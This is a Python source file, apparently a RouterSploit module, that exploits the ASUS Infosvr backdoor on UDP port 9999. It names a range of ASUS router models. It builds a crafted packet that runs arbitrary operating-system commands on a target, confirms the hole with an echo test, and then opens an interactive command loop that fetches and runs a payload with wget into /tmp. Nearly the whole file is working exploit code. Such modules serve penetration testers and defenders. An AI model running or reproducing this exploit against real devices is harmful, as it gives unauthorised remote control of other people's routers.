import socket
import struct
import os
from routersploit.core.exploit import *
from routersploit.core.udp.udp_client import UDPClient


class Exploit(UDPClient):
    __info__ = {
        "name": "Asus Infosvr Backdoor RCE",
        "description": "Module exploits remote command execution in multiple ASUS devices. If the target is "
                       "vulnerable, command loop is invoked that allows executing commands on operating system level.",
        "authors": [
            "Joshua 'jduck' Drake; @jduck",  # vulnerability discovery
            "Friedrich Postelstorfer",  # original Python exploit
            "Michal Bentkowski; @SecurityMB",  # routersploit module
        ],
        "references": [
            "https://github.com/jduck/asus-cmd",
        ],
        "devices": [
            "ASUS RT-N66U",
            "ASUS RT-AC87U",
            "ASUS RT-N56U",
            "ASUS RT-AC68U",
            "ASUS DSL-N55U",
            "ASUS DSL-AC68U",
            "ASUS RT-AC66R",
            "ASUS RT-AC66R",
            "ASUS RT-AC55U",
            "ASUS RT-N12HP_B1",
            "ASUS RT-N16",
        ],
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(9999, "Target UDP port")

    def run(self):
        try:
            if self.check():
                print_success("Target is vulnerable")
                print_status("Invoking command loop...")
                print_status("Please note that only first 256 characters of the "
                             "output will be displayed or use reverse_tcp")
                shell(self, architecture="armle", method="wget", location="/tmp")
            else:
                print_error("Target is not vulnerable")
        except socket.error as ex:
            print_error("Socket error ({ex}). It most likely means that something "
                        "else is listening locally on port UDP:{port}. Make sure to "
                        "kill it before running the exploit again.".format(ex=ex, port=9999))

    def execute(self, cmd):
        if len(cmd) > 237:
            print_error('Your command must be at most 237 characters long. Longer strings might crash the server.')
            return

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.bind(('0.0.0.0', 9999))
            sock.settimeout(2)

            packet = (b'\x0C\x15\x33\x00' + os.urandom(4) + (b'\x00' * 38) + struct.pack('<H', len(cmd)) + cmd).ljust(512, b'\x00')

            sock.sendto(packet, (self.target, 9999))
        except socket.error:
            return ""

        while True:
            try:
                data, addr = sock.recvfrom(512)
            except socket.timeout:
                sock.close()
                return ""
            if len(data) == 512 and data[1] == "\x16":
                break
        length = struct.unpack('<H', data[14:16])[0]
        output = data[16:16 + length]
        sock.close()
        return output

    @mute
    def check(self):
        NUM_CHECKS = 5  # we try 5 times because the exploit tends to be unstable

        for _ in range(NUM_CHECKS):
            random_value = utils.random_text(32)
            cmd = b'echo ' + random_value.encode()
            try:
                retval = self.execute(cmd)
            except socket.timeout:
                continue
            if random_value in retval:
                return True
        return False
